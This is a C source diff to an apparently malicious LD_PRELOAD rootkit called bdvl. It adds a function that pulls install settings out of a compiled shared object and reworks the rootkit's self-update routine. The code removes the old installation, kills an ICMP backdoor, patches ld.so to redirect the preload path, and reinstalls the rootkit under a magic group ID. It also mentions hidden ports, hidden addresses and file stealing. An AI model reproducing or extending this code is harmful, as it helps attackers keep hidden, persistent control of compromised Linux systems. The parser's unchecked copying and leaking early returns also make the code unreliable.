@@ -1,3 +1,69 @@
+char **findsettings(const char *sopath, int *cm){
+    char **values = malloc(sizeof(char*)*4);
+    if(!values) return NULL;
+
+    off_t fsize, cfile;
+    unsigned char *buf;
+    FILE *fp;
+    size_t n;
+    int c=0, got, cmark, k;
+    char *markname;
+
+    hook(CFOPEN);
+
+    fsize = getfilesize(sopath);
+    if(fsize == 0) return NULL;
+
+    buf = malloc(fsize+1);
+    if(!buf) return NULL;
+    memset(buf, 0, fsize+1);
+
+    fp = call(CFOPEN, sopath, "rb");
+    if(fp == NULL) return NULL;
+
+    do{
+        n = fread(buf, 1, fsize, fp);
+
+        for(cmark=0; marknames[cmark] != NULL; cmark++){
+            c=0;
+            got=0;
+            markname = marknames[cmark];
+
+            for(cfile=0; cfile < fsize && got != 1; cfile++){
+                if(buf[cfile] == markname[c]){ // character match
+                    if(c == strlen(markname)-1){
+                        values[cmark] = malloc(PATH_MAX);
+                        if(!values[cmark]){
+                            free(values);
+                            values=NULL;
+                            goto nopenope;
+                        }
+
+                        memset(values[cmark], 0, PATH_MAX);
+                        got=1; // get ready to retrieve value
+                    }
+                    c++;
+                }else c=0;
+
+                if(got){ // read to the end of the value. copy it.
+                    k=0;
+                    cfile=cfile+1;
+                    while(buf[cfile] != '\0')
+                        memcpy(&values[cmark][k++], &buf[cfile++], 1);
+                    values[cmark][k]='\0';
+                }
+            }
+        }
+    }while(n > 0);
+nopenope:
+    free(buf);
+    fclose(fp);
+
+    *cm = cmark;
+    return values;
+}
+
+
 /* uninstall current installation.
  * install new installation.
  *
@@ -6,13 +72,13 @@
  *   2. HOMEDIR is not removed until the end if calling process (you) are in it installing bdvl.
  *   3. and of course..we reinstall with our new version at the very end.  */
 void bdvupdate(char *const argv[]){
-    int gotso=0;
+    char *aso = NULL;
     for(int i = 2; argv[i] != NULL; i++){
         if(strstr(argv[i], ".so."))
-            gotso=1;
-        else gotso=0;
+            aso=argv[i];
+        else aso=NULL;
     }
-    if(!gotso){
+    if(aso == NULL){
         printf("No target .so(s)\n");
         return;
     }
@@ -20,33 +86,40 @@ void bdvupdate(char *const argv[]){
     printf("\nAbout to begin update...\n");
     printf("  Everything from this current installation will be removed.\n");
     printf("  So make sure you've saved stuff you wanna see again.\n");
-    printf("  Enter all settings as they are in the \e[1;31mnew\e[0m configuration.\n");
-    printf("Press enter to continue, ^C to cancel.");
+    printf("Press enter to continue, ^C to cancel.\n");
     getchar();
 
-    /* get settings for new install. */
-    char installdir[PATH_MAX], preloadpath[PATH_MAX], bdvlso[256], mgid[64];
+    int cmark;
+    char **values = findsettings(aso, &cmark);
+    if(!values){
+        printf("Failed finding settings\n");
+        return;
+    }
 
-    gid_t magicgid;
-    printf("\n\e[1;31mINSTALL_DIR:\e[0m ");
-    fgets(installdir, sizeof(installdir), stdin);
-    installdir[strlen(installdir)-1]='\0';
-    
-    printf("\e[1;31mOLD_PRELOAD / PRELOAD_FILE (PATCH_DYNAMIC_LINKER?):\e[0m ");
-    fgets(preloadpath, sizeof(preloadpath), stdin);
-    preloadpath[strlen(preloadpath)-1]='\0';
+    char *bdvlso = values[0],
+         *installdir = values[1],
+         *oldpreload = values[2],
+         *preloadpath = values[3];
 
-    printf("\e[1;31mBDVLSO:\e[0m ");
-    fgets(bdvlso, sizeof(bdvlso), stdin);
-    bdvlso[strlen(bdvlso)-1]='\0';
+    printf("Is PATCH_DYNAMIC_LINKER defined in this new installation? (y/n): ");
+    char status=getchar();
+    if(status != 'y' && status != 'Y' && status != 'n' && status != 'N'){
+        printf("Invalid reply...\n");
+        for(int i=0; i<cmark; i++){
+            free(values[i]);
+            values[i] = NULL;
+        }
+        free(values);
+        return;
+    }
 
-    printf("\e[1;31mMAGIC_GID:\e[0m ");
-    fgets(mgid, sizeof(mgid), stdin);
-    mgid[strlen(mgid)-1]='\0';
-    sscanf(mgid, "%u", &magicgid);
+    char *targetpreload;
+    if(status == 'y' || status == 'Y')
+        targetpreload = preloadpath;
+    else
+        targetpreload = oldpreload;
 
-    printf("\n\e[1;31mARE THESE 100%% CORRECT?\e[0m (ENTER = yes, ^C = cancel)");
-    getchar();
+    printf("Ready!");
 
     /* kill icmp backdoor & remove old INSTALL_DIR & HOMEDIR. */
     printf("\nRemoving previous installation...\n");
@@ -79,29 +152,23 @@ void bdvupdate(char *const argv[]){
     printf("Removing bdvl paths\n");
     rmbdvpaths();
 
-#if defined FILE_STEAL && defined CLEANEDTIME_PATH
-    if(rm(CLEANEDTIME_PATH) < 0)
-        printf("Failed removing CLEANEDTIME_PATH\n");
-#endif
-#ifdef HIDE_PORTS
-    if(rm(HIDEPORTS) < 0)
-        printf("Failed removing hide_ports\n");
-#endif
-#ifdef HIDE_ADDRS
-    if(rm(HIDEADDRS) < 0)
-        printf("Failed removing hide_addrs\n");
-#endif
-
 #ifdef UNINSTALL_MY_ASS
     printf("Uninstalling your ass\n");
     uninstallass();
 #endif
-#ifdef PATCH_DYNAMIC_LINKER
-    printf("Patching ld.so\n");
-    ldpatch(curpreload, preloadpath);
-#endif
+    if(status == 'y' || status == 'Y'){
+        printf("Patching ld.so\n");
+        ldpatch(curpreload, targetpreload);
+    }
 
-    bdvinstall(argv, installdir, bdvlso, preloadpath, magicgid);
+    bdvinstall(argv, installdir, bdvlso, targetpreload, MAGIC_GID);
+    system("cat /dev/null");
+    
+    for(int i=0; i<cmark; i++){
+        free(values[i]);
+        values[i] = NULL;
+    }
+    free(values);
 
     // now we can eradicate...
     if(inhome) eradicatedir(HOMEDIR);
